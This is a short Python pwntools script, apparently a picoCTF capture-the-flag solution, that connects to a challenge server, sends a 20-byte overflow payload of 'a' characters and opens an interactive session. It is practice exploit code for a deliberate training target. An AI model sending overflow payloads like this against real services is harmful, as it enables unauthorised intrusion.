from pwn import *

conn = remote("saturn.picoctf.net", 52822)

payload = b""
payload += b"a" * 20

conn.sendline(payload)
conn.interactive()
